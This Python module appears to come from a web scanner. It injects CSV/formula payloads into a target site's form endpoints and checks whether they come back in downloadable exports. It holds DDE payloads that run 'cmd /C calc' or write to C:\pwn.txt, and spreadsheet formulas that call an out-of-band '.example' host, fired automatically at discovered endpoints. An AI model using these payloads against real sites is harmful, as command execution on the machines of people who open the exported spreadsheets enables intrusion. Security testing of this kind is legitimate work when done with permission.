"""csv_injection v2 — CSV/formula injection with export retrieval."""
import secrets
from urllib.parse import urlparse
from core.http import HttpClient
from core.verify import confidence, is_signal


def _make_payloads():
    tok = secrets.token_hex(4)
    canary = "OMNI_CSV_" + tok
    Q = chr(34)
    return [
        ("dde_calc",      "=cmd|" + Q + " /C calc" + Q + "!A0", "critical"),
        ("dde_canary",    "=cmd|" + Q + " /C echo " + canary + " > C:\\pwn.txt" + Q + "!A0", "critical"),
        ("hyperlink",     "=HYPERLINK(" + Q + "http://omni-" + tok + ".example" + Q + "," + Q + "x" + Q + ")", "high"),
        ("webservice",    "=WEBSERVICE(" + Q + "http://omni-" + tok + ".example" + Q + ")", "high"),
        ("importxml",     "=IMPORTXML(" + Q + "http://omni-" + tok + ".example" + Q + "," + Q + "//a" + Q + ")", "high"),
        ("importdata",    "=IMPORTDATA(" + Q + "http://omni-" + tok + ".example" + Q + ")", "high"),
        ("formula_at",    "@SUM(1+1)*cmd|" + Q + " /C calc" + Q + "!A0", "critical"),
        ("plus_cmd",      "+cmd|" + Q + " /C calc" + Q + "!A0", "critical"),
        ("minus_cmd",     "-cmd|" + Q + " /C calc" + Q + "!A0", "critical"),
        ("canary_marker", "=" + canary, "medium"),
    ]


EXPORT_PATHS = [
    "/export", "/api/export", "/export.csv", "/api/export.csv",
    "/export/xlsx", "/api/export/xlsx", "/export.xlsx",
    "/download", "/api/download", "/download.csv",
    "/report", "/api/report", "/report.csv", "/api/report/export",
    "/api/users/export", "/api/users.csv", "/admin/export",
    "/data/export", "/api/logs/export", "/export/users",
    "/api/v1/export", "/api/v2/export",
]

INPUT_PATHS = [
    "/register", "/signup", "/contact", "/feedback",
    "/api/register", "/api/contact", "/api/feedback",
    "/profile", "/api/profile", "/comment", "/api/comment",
    "/api/message", "/api/note", "/note", "/message",
]

FIELD_NAMES = [
    "name", "username", "email", "comment", "message",
    "title", "feedback", "note", "text", "body", "content",
]


def _is_csv_response(resp):
    if not resp:
        return False
    ct = (resp.headers.get("Content-Type") or "").lower()
    cd = (resp.headers.get("Content-Disposition") or "").lower()
    return ("csv" in ct or "spreadsheet" in ct or "excel" in ct or
            "csv" in cd or "xlsx" in cd or "attachment" in cd)


class CsvInjection:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        print("[csv v2] target: " + base)
        payloads = _make_payloads()
        canary = payloads[9][1].replace("=", "")
        print("[csv v2] canary: " + canary)
        print()
        print("[csv v2] Phase 1: discovery")
        exports_live = []
        for path in EXPORT_PATHS:
            url = base + path
            try:
                r = http.get(url, allow_redirects=False)
            except Exception:
                continue
            if r and r.status_code == 200 and _is_csv_response(r):
                exports_live.append(path)
                print("  export: " + path)
                logger.finding("csv_export_endpoint", "info", path)
        inputs_live = []
        for path in INPUT_PATHS:
            url = base + path
            try:
                r = http.get(url, allow_redirects=False)
            except Exception:
                continue
            if r and r.status_code not in (404, 410):
                inputs_live.append(path)
                print("  input: " + path + " (" + str(r.status_code) + ")")
        if not inputs_live:
            print("[csv v2] no input endpoints — skip")
            return {"findings": []}
        findings = []
        print()
        print("[csv v2] Phase 2: inject + retrieve")
        for in_path in inputs_live:
            in_url = base + in_path
            for pname, payload, sev in payloads[:5]:
                for field in FIELD_NAMES[:5]:
                    body = {field: payload, "email": "csv-" + secrets.token_hex(3) + "@example.com"}
                    try:
                        r = http.post(in_url, data=body, allow_redirects=False)
                    except Exception:
                        continue
                    if not r or r.status_code not in (200, 201, 202, 302, 303):
                        continue
                if not exports_live:
                    continue
                for ex_path in exports_live:
                    ex_url = base + ex_path
                    try:
                        er = http.get(ex_url)
                    except Exception:
                        continue
                    if not er:
                        continue
                    bt = er.text or ""
                    hit = None
                    if payload in bt:
                        hit = payload
                    elif canary in bt:
                        hit = canary
                    if not hit:
                        continue
                    try:
                        er2 = http.get(ex_url)
                    except Exception:
                        er2 = None
                    if not er2 or hit not in (er2.text or ""):
                        continue
                    conf = confidence(0.9, 1.0)
                    if not is_signal(conf, floor=0.55, module="csv"):
                        continue
                    findings.append({
                        "type": "csv_formula_injection",
                        "severity": sev,
                        "input_endpoint": in_path,
                        "export_endpoint": ex_path,
                        "field": field,
                        "payload": payload[:80],
                        "confidence": conf,
                    })
                    print("  CSV INJECTION: " + in_path + " -> " + ex_path)
                    logger.finding("csv", sev, in_path + "->" + ex_path)
                    break
                else:
                    continue
                break
            else:
                continue
            break
        print()
        print("[csv v2] findings: " + str(len(findings)))
        print("[csv v2] exports_live: " + str(len(exports_live)) + " inputs_live: " + str(len(inputs_live)))
        return {"findings": findings, "exports_live": exports_live, "inputs_live": inputs_live}
